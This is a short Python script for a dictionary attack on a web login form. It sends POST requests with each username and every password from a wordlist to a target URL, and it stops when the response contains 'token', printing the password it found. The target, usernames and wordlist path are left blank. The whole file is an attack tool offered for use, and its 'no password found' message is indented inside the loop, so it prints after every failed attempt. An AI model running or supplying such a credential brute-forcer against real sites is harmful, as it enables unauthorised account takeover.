import requests# for web requests
import sys

target = "" # URL
usernames = ["", "", ""]
passwords = ""
needle = "token"#successful login message

for email in usernames:
  with open(passwords, "r") as passwords_list:
    for password in passwords_list:
      password = password.strip("\n").encode()
      # write progress the terminal
      sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(email, password.decode()))
      r = requests.post(target, data={"email": email, "password": password})
      # check for valid request
      if needle.encode() in r.content:
        sys.stdout.write("\n")
        sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), email))
        sys.exit()
      sys.stdout.flush()
      sys.stdout.write("\n")
      sys.stdout.write("\tNo password found for '{}'!".format(email))
      sys.stdout.write("\n")
    
